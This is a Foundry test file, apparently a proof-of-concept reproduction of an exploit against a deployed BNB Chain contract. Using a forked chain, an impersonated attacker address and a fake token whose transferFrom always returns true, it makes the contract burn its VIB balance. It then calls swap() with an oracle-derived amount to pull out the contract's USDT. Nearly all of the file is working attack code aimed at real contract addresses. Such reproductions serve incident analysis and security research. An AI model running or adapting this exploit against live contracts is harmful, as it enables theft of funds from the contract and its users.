// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IVIB {
    function swap(uint256 amount) external;
}

contract FakeToken {
    function transferFrom(address from, address to, uint256 amount) external pure returns (bool) {
        return true; 
    }
    function decimals() external pure returns (uint8) { return 18; }
}

contract VIPExp is Test {
    address constant BUGGY_CONTRACT = 0x92CfD99Fc36b8d5caa592F8eF2617F325F17bA44; 
    address constant REAL_USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant VIB_TOKEN = 0xaa79286E7906e5A71107A9b2c4bb7C80B47bA9C1;
    address constant PRICE_ORACLE = 0xBF94fbD9Dc0bC86B0f4B465E72Aae2603e7b52c0;

    FakeToken public fakeToken;
    address attacker = 0x36F613e26283089CF12283C91815Fb456786C67D;
    
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("bsc"), 39779609 - 1);
        fakeToken = new FakeToken();

        // mint some VIB to attacker for swap
        // uint256 vibAmount = 763571682434939463;
        // vm.prank(0xFAAcbabE2E83907019E52f62044F137c89054521); // VIB token owner
        // IERC20(VIB_TOKEN).transfer(attacker, vibAmount);
    }

    function testAttack() public {
        vm.startPrank(attacker);

        uint256 buggyVibBefore = IERC20(VIB_TOKEN).balanceOf(address(BUGGY_CONTRACT));
        console.log("Buggy Contract VIB Balance Before:", buggyVibBefore);
        
        address randomVarg2 = address(0xdeadbeef);

        address[] memory varg0 = new address[](2);
        varg0[0] = address(fakeToken); // 假 STO
        varg0[1] = address(fakeToken); // 假 USDT

        uint256[] memory varg1 = new uint256[](2);
        varg1[0] = 12500000000000000000; // STO amount
        varg1[1] = 37500000000000000000; // USDT amount

        // 调用 buggy 合约
        // 参数顺序：varg0, varg1, varg2(推荐人), varg3(USDT量), varg4, varg5, varg6(控制分支)
        (bool success, ) = BUGGY_CONTRACT.call(
            abi.encodeWithSelector(
                0x130200c3, 
                varg0, 
                varg1, 
                randomVarg2, 
                // 345147905179352825856, // varg3: what meaning
                1e18,
                buggyVibBefore, 
                1,
                1          // 让 varg6.length > 1 进入目标分支
            )
        );
        require(success, "Attack Call Failed");

        uint256 buggyVibAfter = IERC20(VIB_TOKEN).balanceOf(address(BUGGY_CONTRACT));
        console.log("Buggy Contract VIB Balance After Burn:", buggyVibAfter);
        require(buggyVibAfter < buggyVibBefore, "Burn failed!");

        // log buggy contract USDT balance
        uint256 buggyUsdtBalance = IERC20(REAL_USDT).balanceOf(BUGGY_CONTRACT);
        console.log("Buggy Contract USDT Balance:", buggyUsdtBalance);
        // log attacker VIB balance
        uint256 attackerVibBalance = IERC20(VIB_TOKEN).balanceOf(attacker);
        console.log("Attacker VIB Balance Before SWAP:", attackerVibBalance);

        // approve buggy contract to spend attacker's VIB
        IERC20(VIB_TOKEN).approve(BUGGY_CONTRACT, attackerVibBalance);

        // get price with staticall
        bytes memory data;
        (success, data) = PRICE_ORACLE.staticcall(abi.encodeWithSelector(0xbeb5529a));
        // require(success, "Static call failed");
        uint256 price = abi.decode(data, (uint256));
        console.log("Price from Oracle:", price);

        // compute VIP with fee
        uint256 fee_rate = 0x1a055690d9db80000;
        

        uint256 v4 = (buggyUsdtBalance * 1e18) / price;
        uint256 vipAmount = (v4 * 10**20) / (10**20 - fee_rate);

        console.log("Computed VIP Amount:", vipAmount);

        // call swap() via buggy contract to realize profit
        IVIB(BUGGY_CONTRACT).swap(vipAmount / 2);

        // log final USDT balance
        uint256 attackerUsdtBalance = IERC20(REAL_USDT).balanceOf(attacker);
        console.log("Attacker USDT Balance After Swap:", attackerUsdtBalance);


        vm.stopPrank();
    }
}

